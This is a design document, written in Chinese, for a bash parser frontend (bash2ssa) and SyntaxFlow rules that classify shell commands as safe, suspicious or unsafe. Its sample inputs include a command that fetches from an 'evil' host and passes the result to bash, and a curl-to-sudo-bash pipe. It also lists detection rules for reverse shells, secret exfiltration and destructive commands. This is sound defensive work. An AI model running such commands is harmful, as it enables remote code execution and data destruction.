# Bash 前端（bash2ssa）与命令安全判定 — 设计分析

> 状态：设计稿（未实现）
> 目标分支：`feat/bash-ssa-frontend`
> 范围：把 bash 接入 SSA 的 AST 解析 + build 管线，并能用 SyntaxFlow 规则对单条 bash 命令的
> 结构/参数做安全判定。

## 0. 结论先行

1. **新增一门语言 `bash`**，实现 `ssa.Builder` 接口，包放在 `common/yak/bash/bash2ssa`。
2. **解析器选 `mvdan.cc/sh/v3/syntax`**（Go 生态里 shfmt 的解析器），不使用 ANTLR。原因见 §3：
   bash 的 heredoc、参数展开、命令替换、引号内拼接用 ANTLR 文法很难做对，维护成本高；
   `mvdan` 是成熟的纯 Go 解析器，AST 信息足够完整。
3. **命令即 SSA Call**：
   - `Call.Method` 指向一个按命令名命名的 callee（如 `curl`、`rm`）；
   - `Call.Args` 是 argv（**包含 argv[0]**，与 Go 的 `exec.Command(name, args...)` 语义对齐）；
   - 管道、重定向、heredoc 等 I/O 关系挂在 `Call.Binding` 上（`stdin` / `stdout` / `stderr`）。
     `Call.GetValues()` 已经会遍历 `Binding`，所以 `->` / `#->` 数据流天然可用（见 §4.4）。
4. **规则目录**：`common/syntaxflow/sfbuildin/buildin/bash/`，规则必须显式写
   `desc(language: "bash")`（目录名不会自动绑定语言，文件名只有以 `bash-` 开头才会被推断）。
5. **安全判定不要做成“没命中规则 = 安全”**。推荐三态：`safe` / `suspicious` / `unsafe`，
   其中 `safe` 必须由白名单策略正向确认；SyntaxFlow 负责结构、数据流和危险模式识别。
6. **单条命令检测走内存编译**：`ssa.Parse(cmd, ssa.withLanguage(ssa.Bash), ssa.withMemory(true))`，
   避免每次判定都写 IR 数据库（`MemoryCompile` 分支见 `common/yak/ssaapi/ssa_compile.go:73-77`）。

---

## 1. 现有编译管线（接入点盘点）

### 1.1 单片段（最适合“一条 bash 命令”）

调用链：

```
ssaapi.Parse(code, opts...)
  common/yak/ssaapi/ssa_exports.go:85
→ ParseFromReader
  common/yak/ssaapi/ssa_exports.go:90
→ DefaultConfig(opts...)
  ssa_config.go:444  按 language 在 LanguageBuilderCreater 里取 CreateBuilder
→ config.parseFile()
  common/yak/ssaapi/ssa_compile.go:33
→ config.parseSimple(editor)
  common/yak/ssaapi/ssa_compile.go:132
     c.init(...)                       // 建 Program / main FunctionBuilder
     LanguageBuilder.InitHandler(b)    // PreHandlerBase 默认实现
     LanguageBuilder.ParseAST(source, nil)
     PreHandlerFile(ast, r, b)         // 默认 no-op
     prog.Build(ast, r, b)             // → LanguageBuilder.BuildFromAST(ast, fb)
     builder.Finish(); ssa4analyze.RunAnalyzer(prog)
→ prog.SaveEditor / Finish / UpdateToDatabase（MemoryCompile 时跳过）
```

关键风险：`parseSimple` 在 `LanguageBuilder == nil` 时会**静默回退为 Yak**
（`common/yak/ssaapi/ssa_compile.go:144-146`）。所以 `bash` 必须在当前 build 里注册成功，
否则 `ssa.Parse(cmd, withLanguage("bash"))` 会用 Yak 去解析一段 shell 命令，结果不可信。
必须加一个“编译产物 Language/callee 是否正确”的测试兜底。

### 1.2 项目（扫描 `.sh` 脚本目录时）

```
ssaapi.ParseProject(opts...)
  common/yak/ssaapi/ssa_compile_project.go:165
→ parseProject
  common/yak/ssaapi/ssa_compile_project.go:230
→ parseProjectWithFS / parseProjectWithFSUnits
  common/yak/ssaapi/ssa_compile_fs.go:748 / :211
     ensureLanguageBuilder()
     swapLanguageFs()                     // WrapWithPreprocessedFS
     ScanProjectFiles()                   // 用 FilterFile / FilterPreHandlerFile 选文件
     buildCompileUnitPlanEdges()          // PartitionCompileUnits + 依赖排序
     c.init(...)
     GetFileHandler(...)                  // 并发 ParseAST，FilterParseAST 过滤
     prehandle.consume(...)               // PreHandlerProject/PreHandlerFile
     prog.Finish(); UpdateToDatabaseWithWG; Cache.SaveToDatabase
```

### 1.3 新语言必须实现的接口

`common/yak/ssa/extra_file_analyzer.go:108-117`：

```go
type CreateBuilder func() Builder

type Builder interface {
    BuildFromAST(FrontAST, *FunctionBuilder) error
    FilterFile(string) bool
    GetLanguage() ssaconfig.Language
    PreHandlerAnalyzer
    UnitPartitioner
}
```

`PreHandlerAnalyzer` / `UnitPartitioner` 中：

- 必须自己实现：`BuildFromAST`、`FilterFile`、`GetLanguage`、`WrapWithPreprocessedFS`、
  `FilterParseAST`、`ParseAST`、`GetAntlrCache`。
- `PreHandlerBase` 已提供默认：`InitHandler`、`PreHandlerFile`(no-op)、`PreHandlerProject`(nil)、
  `FilterPreHandlerFile`(false)、`UsesDeferredFileBuild`(false)、目录分单元、`Clearup`。

`PreHandlerBase.Clearup()` 对 nil cache 是安全的（`common/yak/ssa/extra_file_analyzer.go:214-222`），
因此 bash 不用 ANTLR cache 时 `GetAntlrCache()` 返回 nil 即可。

### 1.4 注册位置

`common/yak/ssaapi/ssa_language_builder_creater.go:21-31`：

```go
var LanguageBuilderCreater = map[ssaconfig.Language]ssa.CreateBuilder{
    ssaconfig.Yak:    yak2ssa.CreateBuilder,
    ssaconfig.JS:     ts2ssa.CreateBuilder,
    ...
}
```

精简 build 另有一份：`ssa_language_builder_creater_without_exlanguage.go`（`//go:build irify_exclude`，
只保留 Yak）。加新语言时必须决定是否进入精简 build（见 §5）。

---

## 2. 需求拆解

输入：一条 bash 命令（可能是多行脚本片段），例如：

```bash
cmd=$(curl -s http://evil/x); bash -c "$cmd"
rm -rf /tmp/build && echo done
curl -fsSL https://x/install.sh | sudo bash
```

需要解析出的“参数/结构”：

- 命令身份：`curl` / `rm` / `bash`（含 `/bin/rm`、`sudo rm`、`$CMD` 等）
- 参数与选项：`-rf`、`-c`、`--privileged`、URL、路径
- 展开来源：字面量 / 引号 / `$var` / `${var:-x}` / `$(cmd)` / 算术 / glob / heredoc
- 结构：管道、`&&`/`||`、子 shell、命令替换、重定向、函数、循环
- 控制/数据流：哪些输入（环境变量、位置参数、stdin、下载内容）流到了哪些 sink

然后用 SyntaxFlow 表达“什么是危险的”。

---

## 3. 解析器选型

| 方案 | 优点 | 缺点 |
|---|---|---|
| ANTLR + grammars-v4 Bash grammar | 与仓库其他语言一致；走 `antlr4util.ParseASTWithSLLFirst` | bash 文法覆盖差（heredoc/展开/重定向歧义），需要大量 target-specific 代码和预处理；生成物大；调试成本高 |
| `mvdan.cc/sh/v3/syntax` | 成熟（shfmt 同源）；完整 AST；保留 quote/expansion 结构；纯 Go | 引入新依赖；与仓库现有“ANTLR 语言”风格不一致 |
| 仓库内 `common/utils/shlex` | 已有 | 只是分词器，**没有结构**，无法满足需求 |
| 只用 `mode: source` 正则规则 | 零前端成本 | 无法可靠处理引号/嵌套/展开，容易误报漏报；不满足“解析参数/结构” |

### 3.1 现成 ANTLR bash 文法调研

仓库的 ANTLR 工具链本身没问题：`common/yak/antlr4thirdparty/antlr-4.13.2-complete.jar`、
各语言的 `gen.sh` / `antlr_Taskfile.yml`、`antlr4util.ParseASTWithSLLFirst` 都可以直接复用。
**真正的瓶颈是文法质量，不是运行时。**

调研结果：

- `antlr/grammars-v4` 当前顶层没有 `bash` / `shell` 目录；网上流传的 `BashLexer.g4` /
  `BashParser.g4` 多来自第三方仓库。
- 可查到的代表实现：
  - `drifter-roy/antlr4_bash`：Lexer 134 行，Parser 72 行；
  - `Roche-CAPT/CAPT` 的 bash 文法：Lexer 136 行，Parser 75 行（与上者高度同源）。
- 它们的共同缺陷：
  - **没有 heredoc**：`<<` 只当普通重定向，heredoc body 会被当成后续命令解析；
  - 没有 `&&` / `||`，没有 `if/for/while/case/function`，`NL` 直接 `skip`；
  - 算术 `$((...))` 明确写着 TODO；
  - `arg` 是 token 大杂烩（`VARNAME | PUNCS | NUM | ...`），命令名/参数/选项的边界不可靠；
  - 引号、参数展开、命令替换虽然有 lexer mode，但覆盖不完整。

因此“直接用 ANTLR”实际等于**自研并长期维护一份完整的 bash 文法**：heredoc 需要在 lexer 里
按 delimiter 动态切 mode（或做预处理提取 body），再加上列表/控制流/函数的语法规则。
这是一条可行但成本高、回归风险大的路线。

如果组织上必须用 ANTLR，建议的降级路径是：

1. 以现有文法为起点，先补 `&&/||`、语句列表、`if/for/while/case`、函数定义；
2. heredoc 用**预处理器**（类比 C 前端的 `preprocess_fs.go` / PHP 的 `preprocess.go`）：
   扫描并抽出 heredoc body，替换成占位符，解析后再把 body 挂回 redirection；
3. 重写 `arg` 规则，让 Word 的各个 part 成为独立语法节点，才能可靠区分字面量/展开；
4. 建立语料覆盖门槛，解析失败或结构不完整时统一判 `suspicious`，不允许猜。

**建议**：选 `mvdan.cc/sh/v3/syntax`，用 `syntax.LangBash`。它是纯 Go、无 CGO，AST 形如
`syntax.File -> []*syntax.Stmt -> syntax.CallExpr / Pipeline / BinaryCmd / IfClause / ...`，
Word 由 `Lit / SglQuoted / DblQuoted / ParamExp / CmdSubst / ArithExp / ProcSubst / ExtGlob` 组成。
这正好对应我们需要的“字面量 vs 展开”区分。

若组织上不接受新依赖，再退回 ANTLR 文法方案；此时应把目标降级为“主流命令 + 常见结构”，
并把不支持的语法标记为 unknown，而不是猜测。

`GetAntlrCache()` 直接返回 nil；`ParseAST` 内部自己调 mvdan，不需要 DFA cache。

---

## 4. `bash2ssa` 设计

### 4.1 目录结构

```
common/yak/bash/bash2ssa/
  builder.go        // CreateBuilder + Builder 接口实现
  frontend.go       // mvdan Parse -> ssa.FrontAST
  visit_stmt.go     // StmtList / Pipeline / BinaryCmd / If/For/While/Case / FuncDecl
  visit_command.go  // CallExpr / Assign / Redirect / HereDoc
  visit_word.go     // Word 各 part -> SSA value（含 $var / $(...) / 算术）
  builtins.go       // 命令名解析、wrapper 拆解、eval/sh -c 递归
  types.go          // shell.stdin / shell.redir / shell.positional 等标记类型
  builder_test.go
```

### 4.2 接口实现骨架

```go
type SSABuilder struct{ *ssa.PreHandlerBase }

var _ ssa.Builder = (*SSABuilder)(nil)

func CreateBuilder() ssa.Builder {
    b := &SSABuilder{PreHandlerBase: ssa.NewPreHandlerBase()}
    b.WithLanguageConfigOpts(
        // bash 没有类/虚调用；按需打开
        ssa.WithLanguageBuilder(b),
    )
    return b
}

func (*SSABuilder) GetLanguage() ssaconfig.Language { return ssaconfig.BASH }

func (*SSABuilder) FilterFile(path string) bool {
    ext := strings.ToLower(filepath.Ext(path))
    return ext == ".sh" || ext == ".bash"
}

func (*SSABuilder) FilterPreHandlerFile(path string) bool { return false } // 不需要预处理

func (*SSABuilder) FilterParseAST(path string) bool { return true } // 已由 FilterFile 过滤

func (*SSABuilder) ParseAST(src string, _ *ssa.AntlrCache) (ssa.FrontAST, error) {
    f, err := syntax.NewParser(syntax.Variant(syntax.LangBash)).Parse(strings.NewReader(src), "")
    if err != nil { return nil, utils.Wrap(err, "bash parse failed") }
    return f, nil
}

func (*SSABuilder) BuildFromAST(raw ssa.FrontAST, b *ssa.FunctionBuilder) error {
    f, ok := raw.(*syntax.File)
    if !ok { return utils.Errorf("invalid AST: %T", raw) }
    newBuilder(b).buildFile(f)
    return nil
}

func (*SSABuilder) WrapWithPreprocessedFS(fs fi.FileSystem, _ bool) fi.FileSystem { return fs }

func (*SSABuilder) GetAntlrCache() *ssa.AntlrCache { return nil }
```

`UsesDeferredFileBuild()` 保持默认 `false`，走通用 `prog.Build` 路径；`PartitionCompileUnits`
用默认目录分组即可（shell 没有 import 图；`source` 的依赖无法静态确定）。

### 4.3 AST → SSA 映射

| bash AST | SSA 表达 |
|---|---|
| `File` / `StmtList` | `main` 函数 + 基本块顺序 emit |
| `CallExpr` | `Call(callee, argv)`；`Assigns` 先写变量 |
| `Lit` / `SglQuoted` | `EmitConstInst(string)` |
| `DblQuoted` / 多 part Word | 逐个 part 求值后 `EmitBinOp(OpAdd, ...)` 拼接（保留数据流） |
| `ParamExp`（`$x`、`${x:-d}`、`$1`、`$@`、`$IFS`） | `ReadValue(name)`；未定义则 `EmitUndefined(name)` 并标记为 source |
| `CmdSubst`（`$(...)` / 反引号） | 递归编译内部语句；替换表达式的值 = 内层最后一个命令的 Call 值 |
| `ArithExp`（`$((...))`） | 编译算术；结果值 + 操作数 def-use |
| `ProcSubst`（`<(...)` / `>(...)`） | 递归编译；结果作为文件/流值 |
| `Pipeline` | 逐段编译；后一段 `Binding["stdin"] = 前一段 Call` |
| `BinaryCmd`（`&&` / `||`） | 分支基本块；两条路径都编译（安全分析取并集） |
| `IfClause` / `WhileClause` / `ForClause` / `CaseClause` | 优先真实 CFG（`EmitIf` / `EmitLoop` / `EmitSwitch`）；首期可退化为顺序 emit 所有分支，保证不漏 sink |
| `FuncDecl` | `Program.NewFunction(name)`；位置参数 `$1..$n`、`$@`；函数体独立 build |
| `Redirect` | 目标 word 求值；按操作符挂 `Binding["stdin"/"stdout"/"stderr"]` |
| `HereDoc` / `<<<` | 内容值挂 `Binding["stdin"]`，类型标记 `shell.heredoc` |
| `Background`（`&`）/ `Negated`（`!`） | 作为 Call/语句元信息（binding 或类型），不影响 sink 识别 |

### 4.4 Call 约定（这是规则好不好写的基础）

**参数布局**：

```
Args[0]      = 命令词（argv[0]）
Args[1..n]   = 实际参数/选项，保持源码顺序
Binding      = 命名 I/O 边：
  "stdin"    = 管道前一段的 Call 值 / heredoc 内容 / `< file` 的值
  "stdout"   = `>` / `>>` / `&>` 的目标值
  "stderr"   = `2>` / `2>&1` 的目标值
  "wrapped_by" = 外层 wrapper（sudo/env/timeout/...）的 Call
  "payload"  = eval / sh -c 的脚本字符串值
```

`Args[0]` 包含命令名，和 Go `exec.Command(name, args...)` 一致；规则用 `slice(start=1)` 跳过它。

**callee 命名**：

- 能静态确定的命令：`Program.NewFunction(name)`，按 name 做缓存（避免 `rm$1` 这类后缀）。
- 脚本里定义的函数优先于外部命令。
- 动态命令（`$CMD`、`${arr[0]}`）：callee 用哨兵函数 `Command`，`Args[0]` 放动态值；
  规则把 `Command` 视为“未知 callee”，默认按不安全/需人工确认处理。
- `/bin/rm`：callee 用 basename `rm`，原始路径保留在源码 range 中；如需精确匹配，后续可加
  `Binding["argv0_raw"]`。

**为什么用 `Binding` 而不是把管道输入塞进 `Args`**：

- `Call.GetValues()` 会遍历 `Args + ArgMember + Binding`（`common/yak/ssa/use.go:280-294`），
  `fixupUseChain` 会据此建立 def-use（`common/yak/ssa/InstructionEmit.go:14-25`），
  所以 `->` / `#->` 能正常从 `curl` 追到 `bash`。
- `GetCallActualParams` 只读 `Args`（`common/yak/ssaapi/sf_value.go:193-230`），
  如果把 stdin 塞进 `Args`，`slice(index=N)` 的语义会被污染。
- 需要从 stdin 侧写规则时，可以加一个小 native call，例如 `getCallBinding(name: "stdin")`；
  不加也能从生产者侧写：`curl(* as $x) -> *`。

**字面量 vs 展开**：纯字面量是 `ConstInst`，含 `$var`/`$(...)` 的 Word 是计算值（BinOp/Call）。
规则可以用 `?{opcode: const}` 区分“固定参数”和“动态参数”，这是 SSA 化带来的关键能力。

### 4.5 wrapper、eval、解释器

单独把 `sudo rm -rf /` 解析成“`sudo` 调用 + 参数字符串”对规则不友好。建议在 frontend 里做
**有限度的命令结构化**：

1. **wrapper 拆解**：`sudo`、`env`、`timeout`、`nice`、`ionice`、`nohup`、`exec`、`command`、
   `builtin`、`stdbuf`、`xargs`、`find ... -exec`。
   - 先 emit 外层真实 Call（保证 `sudo` 规则能命中）；
   - 再对“有效命令”emit 一个内层 Call（保证 `rm`/`bash` 等 sink 规则能命中）；
   - 两者用 `Binding["wrapped_by"]` 关联，结果层去重。
2. **`eval` / `sh -c` / `bash -c` / `python -c` 等**：
   - 外层 Call 始终 emit；
   - 如果脚本字符串是常量，递归解析并 emit 内层调用（设最大深度，例如 3，防炸）；
   - 若非常量，只保留外层 Call，并把 payload 标为动态 → 规则判 suspicious。
3. **`source` / `.`**：不解析文件内容（文件可能不存在/不可信），只作为“动态代码加载”sink。
4. **常见子命令**（`git clone`、`docker run --privileged`、`pip install`）：不特殊建模，
   由规则读取 argv 判断即可。

### 4.6 作用域与控制流

- 变量用 `b.CreateVariable` + `b.AssignVariable`；`$1`/`$@`/环境变量用独立命名空间并标记来源类型。
- `export`/`local`/`declare` 当作赋值处理。
- shell 是动态作用域，SSA 只能近似；对安全判定来说“宁可多连一条边，不漏 sink”。
- 控制流首期可以保守地顺序 emit 所有分支（`if` 两个分支都编译、循环体至少编译一次），
  这样危险命令不会因为“条件不可达”被漏掉；代价是数据流可能过度近似。
  二期再换成真实 CFG，提升精度。

### 4.7 标记类型

为了让规则能区分“这是 stdin 还是普通参数”，建议用命名类型/别名：

- `shell.stdin`、`shell.heredoc`
- `shell.stdout`、`shell.stderr`
- `shell.env`、`shell.positional`（不可信来源）
- `shell.command`（动态 callee）

SSA 的 `AliasType` 可以携带名字（`common/yak/ssa/type.go:857-870`），`<typeName>` 可以过滤。
如果发现类型系统接入成本高，二期可以退而求其次：用 `Binding` + native call 暴露结构。

---

## 5. 语言注册与 build 改动清单

| 文件 | 改动 |
|---|---|
| `common/yak/ssaapi/ssaconfig/language.go` | 加 `BASH Language = "bash"`；`GetFileExt` 返回 `.sh`；加入 `GetAllSupportedLanguages`；`ValidateLanguage` 接受 `bash/sh/shell` |
| `common/yak/ssaapi/ssa_language_builder_creater.go` | import `bash2ssa`，map 加 `ssaconfig.BASH: bash2ssa.CreateBuilder` |
| `common/yak/ssaapi/ssa_language_builder_creater_without_exlanguage.go` | **建议不加**：精简 build 本来就没有 SyntaxFlow，bash 前端无意义；但 `GetAllSupportedLanguages` 是共享的，UI 会显示 bash，需要在文档/上层处理这个不一致，或用 build tag 拆语言列表 |
| `common/yak/ssaapi/ssa_exports.go:200-206` | 加 `"Bash": ssaconfig.BASH`，让 Yak 脚本能写 `ssa.withLanguage(ssa.Bash)` |
| `common/yak/ssaapi/ssa_compile_utils.go:209-223` | 可选：`astSlotCostBytes` 加 bash case（默认值也能用） |
| `common/yak/ssaapi/ssaconfig/scan_policies.yaml` | 可选：加 bash 技术栈条目（UI 规则组） |
| `common/schema/syntaxflow_rule.go` | 无需改：`GetAllSFSupportLanguage()` 自动走 `GetAllSupportedLanguages` |
| `common/yak/ssadb/*` | **无需迁移**：`Program.Language` 只是字符串，`ir_programs.language` 有索引但无枚举约束 |
| 新 `common/yak/bash/commandcheck/` | 安全判定 API（依赖 `ssaapi`，不能反向被 `bash2ssa` 依赖） |

构建注意：

- `mvdan.cc/sh/v3` 是纯 Go；需要评估二进制增量（预计几 MB 量级，实测后再定论）。
- 精简 build 的测试要用 `-tags irify_exclude`；如果 bash 只在完整 build 注册，精简 build 下
  `ssa.Parse(..., "bash")` 会回退 Yak，必须显式返回“不支持”或至少加测试防回归。
- 内嵌资源（规则 hash）不要手动改：按仓库约定由 CI bot 更新（见 `.agents/skills/embed-hash-ci/SKILL.md`）。

---

## 6. SyntaxFlow 规则设计

### 6.1 绑定语言

- 规则必须写 `desc(language: "bash", mode: "ssa")`。
- 目录名不会设置语言；文件名只有 `bash-*.sf` 形式才会被 `sfdb` 推断（`common/syntaxflow/sfdb/rule_op.go:401-432`）。
  所以 `cwe-78-*.sf` 这种命名必须显式 desc。
- 普通扫描会跳过 `rule.Language != program.Language` 的规则（`General` 除外，
  `common/yak/syntaxflow_scan/runtime.go:198-208`）；直接查询不受此限。

### 6.2 规则分层

```
common/syntaxflow/sfbuildin/buildin/bash/
  lib/
    bash-sinks.sf            // 破坏性/提权/解释器命令集合（无 alert，供 include）
    bash-sources.sf          // env/positional/stdin/下载内容
    bash-fetchers.sf         // curl/wget/nc/socat/ssh/scp
  cwe-78-os-command-injection/
    bash-pipe-to-shell.sf
    bash-eval.sf
    bash-interpreter-c.sf
    bash-command-substitution.sf
  destructive/
    bash-rm-rf-root.sf
    bash-dd-device.sf
    bash-mkfs.sf
    bash-chmod-777.sf
    bash-fork-bomb.sf
  privesc/
    bash-sudo-su.sf
    bash-write-ssh-authorized-keys.sf
    bash-write-cron.sf
  exfil/
    bash-curl-upload-secret.sf
    bash-nc-reverse-shell.sf
  obfuscation/
    bash-base64-to-shell.sf
    bash-ifs-obfuscation.sf
  policy/
    bash-allowlist.sf        // 供判定层使用
```

### 6.3 规则示例

危险命令集合（lib，不 alert）：

```sf
desc(
    mode: "ssa"
    language: "bash"
    title_zh: "Bash 危险命令集合（lib）"
    lib: "bash-destructive-commands"
)
/^(rm|dd|mkfs(\..+)?|shred|chmod|chown|chattr|mount|umount|kill|pkill|killall|shutdown|reboot|halt|poweroff|useradd|userdel|passwd|visudo)$/ as $sink
```

`rm -rf /`（结构 + 参数）：

```sf
/^rm$/ as $rm
$rm(* as $argv) as $call
$call?{have: "-r"} as $rec
$call?{have: "-f"} as $force
$argv?{have: /\/(\*)?$/} as $root_target
alert $call for { ... }
```

说明：`$call?{have: "-rf"}` 能工作，因为 `have` 会匹配 `Call.String()`
（含 callee 与所有 args，见 `common/yak/ssaapi/sf_prog.go:74-101`）；但 `-r` 与 `-f` 分开更稳。

管道到 shell：

```sf
/^(curl|wget|fetch)$/ as $fetcher
$fetcher(* as $argv) as $download
/^(sh|bash|zsh|dash|ksh|ash)$/ as $shell
$shell(* as $argv2) as $exec
$download -> $exec as $pipe
alert $pipe for { ... }
```

因为 `Binding["stdin"]` 参与 `Call.GetValues()`，`$download -> $exec` 能拿到 use 边。

`bash -c "$x"` 且 `$x` 来自命令替换：

```sf
/^(sh|bash|zsh|dash|ksh)$/ as $shell
$shell?{have: "-c"} as $call
$call(*<slice(start=2)> as $payload) as $payloadValue
$untrusted #-> $payloadValue as $hit
```

注意 `Args[0]` 是 `bash`，`-c` 在 index 1，payload 从 index 2 开始，所以 `slice(start=2)`。

动态 callee（`$CMD`）默认按 unknown 处理：

```sf
/^Command$/ as $dynamic
$dynamic(* as $argv) as $call
alert $call for { ... }
```

命令名里的 `-` 不是 SyntaxFlow identifier 字符，所以 `apt-get` 要写成 `/apt-get/` 这类正则。

### 6.4 判定层的“安全规则”

不要只写危险规则。判定层需要两类：

- **deny 规则**：命中 → `unsafe`（`rm -rf /`、pipe-to-shell、eval、动态 callee、写 authorized_keys 等）。
- **allow 规则**：命令 + 参数模式整体匹配白名单 → `safe`（如 `ls`、`cat`、`grep`、`git status`、
  `curl -fsSL <固定域名>` 等，具体策略由产品定义）。

中间态（没有 deny，也不满足 allow）→ `suspicious`，要求人工确认。

---

## 7. 安全判定 API

建议新增 `common/yak/bash/commandcheck`（名字待定）：

```go
type Verdict int

const (
    VerdictSafe Verdict = iota
    VerdictSuspicious
    VerdictUnsafe
)

type Finding struct {
    RuleID   string
    Title    string
    Severity string
    Value    string   // 命中的命令/参数
    Start, End int    // 源码 range，便于 UI 高亮
}

type Result struct {
    Verdict  Verdict
    Findings []Finding
    Reasons  []string
}

func CheckCommand(cmd string, opts ...Option) (*Result, error)
```

实现流程：

1. `ssaapi.Parse(cmd, ssaapi.WithRawLanguage(ssaconfig.BASH), ssaapi.WithMemory(true), ssaapi.WithEnableCache(true))`
   - `WithMemory` 跳过 IR 落库（`ssa_compile.go:73-77`）；
   - `WithEnableCache` 复用 TTL/single-flight 缓存（`ssa_exports.go:107-116`）。
2. 用固定规则集运行 `prog.SyntaxFlowRule(rule)`（或 `QueryWithRuleContent`）。
3. 汇总：
   - 任一 deny 命中 → `unsafe`；
   - 否则若 allow 规则完整覆盖命令 → `safe`；
   - 否则 → `suspicious`。
4. 输出 evidence（命中值 + range），不要只给布尔值。

性能：

- 单条命令的 SSA 规模很小，预期在亚毫秒到毫秒级；需要实测 p50/p99。
- 高频调用时加 LRU（命令文本 + 规则集版本为 key）；`WithEnableCache` 已有一层缓存。
- 若判定 API 要走 Yak 脚本，可在 yaklib 加一个 `bash` 模块导出 `CheckCommand`；
  注意精简 build 下它依赖的 `ssaapi` 是 stub，应返回明确错误。

**重要**：该判定不能作为唯一执行闸门。静态分析对 `eval`、`source`、别名、运行时拼接是
天然不完备的；产品上应把它定位为“风险提示 + 白名单辅助”，真正的执行隔离要靠沙箱/最小权限。

---

## 8. 分阶段实施计划

### Phase 0：依赖与语法覆盖验证（0.5–1 天）

- 引入 `mvdan.cc/sh/v3`，写一个临时 dump 程序，对 50–100 条真实命令/脚本跑通。
- 重点验证：heredoc、`$()`、`${}`、引号拼接、`&&/||`、重定向、函数、`eval`、`sh -c`。
- 产出：解析失败的语法清单；确认是否可接受。

验收：目标语料 parse 成功率 ≥ 99%（失败项有明确降级策略）。

### Phase 1：最小可用前端（2–3 天）

- 注册语言；实现 `ParseAST` / `BuildFromAST`。
- 支持：简单命令、字面量/引号参数、变量赋值与 `$var`、管道、基础重定向。
- 规则验证：
  - `curl(* as $argv)`、`rm(* as $argv)` 能命中；
  - `curl ... | sh` 能通过 `->` 连起来。
- 测试：`ssa.Parse("curl x")` 的 Language 必须是 `bash`（防 Yak 回退）。

### Phase 2：结构补全（3–5 天）

- `CmdSubst` / `ArithExp` / `ProcSubst` / heredoc；
- `&&/||`、`if/for/while/case`、函数；
- wrapper 拆解（sudo/env/xargs/find -exec）；
- `eval` / `sh -c` 常量载荷递归编译；
- 动态 callee 哨兵与标记类型。

验收：危险命令不会因为嵌套结构漏掉；误连边可解释。

### Phase 3：规则集与判定 API（3–5 天）

- 按 §6 落规则；补齐 `desc`、alert、solution；
- 实现 `CheckCommand` 三态；
- 建立 safe/unsafe 语料（≥ 100 条），统计误报/漏报；
- 与产品确认白名单默认策略。

### Phase 4：build/发布收尾（1–2 天）

- 决定精简 build 是否包含 bash；
- 测二进制增量、启动时间；
- 文档、UI 技术栈条目、CI 规则格式检查；
- 按仓库约定不手改 embed hash，交给 CI。

---

## 9. 风险与限制

1. **shell 是动态语言**：别名、`eval`、`source`、运行时变量、glob、word splitting、`$IFS`、
   `PATH` 解析、shell 选项都会让静态结果不完备。结论必须允许 “unknown”。
2. **命令名无法穷举**：`./malware.sh`、`$CMD`、函数、内建命令。动态 callee 必须默认保守。
3. **别名/函数覆盖**：脚本内函数优先；`alias` 无法静态求值，建议按未知处理。
4. **误报**：管道到 `sh` 在安装脚本里很常见；规则需要区分“下载即执行”和“固定本地脚本”。
   单靠语法无法区分，要结合参数/来源规则。
5. **新依赖**：`mvdan.cc/sh/v3` 需组织批准；许可证、供应链、二进制增量都要过一遍。
6. **精简 build 不一致**：语言列表是共享的，UI 可能显示一个精简版无法编译的语言；
   要么接受并在上层隐藏，要么用 build tag 拆语言列表。
7. **回退 Yak 的静默失败**：`ssa.Parse` 在 builder 未注册时会用 Yak 编译，必须用测试锁住。
8. **规则 hash/CI**：新增 `.sf` 后不要本地计算 hash；按仓库约定等 CI bot 提交。
9. **测试规范**：本仓库只允许运行单个精确指定的 Go 测试，禁止整包/多包/`-race`/压力循环
   （见 `.agents/skills/go-test-safety/SKILL.md`）。

---

## 10. 待确认问题

1. 是否接受引入 `mvdan.cc/sh/v3/syntax`？若不接受，是否退回 ANTLR 文法并接受覆盖度下降？
2. bash 是否要出现在 Yakit/IRify 的“项目语言/技术栈”里？还是只作为命令检测的内部语言？
3. 判定 API 的形态：Go 内部包、Yak 标准库模块，还是 gRPC 接口？
4. 安全策略默认值：默认拒绝（白名单）还是默认放行（黑名单）？三态的阈值怎么定？
5. 范围：只支持单条命令，还是要覆盖完整 `.sh` 脚本（含函数、source、控制流）？
6. 精简 build（`irify_exclude`）是否纳入 bash 前端？

---

## 附：一句话口径

> bash 作为一门 SSA 语言接入：mvdan 解析出结构化 AST，命令编译成 `Call`（argv 在 `Args`，
> I/O 在 `Binding`），SyntaxFlow 规则识别 sink/source/数据流；安全判定用“危险规则 + 白名单”
> 输出三态结论，而不是“没命中就安全”。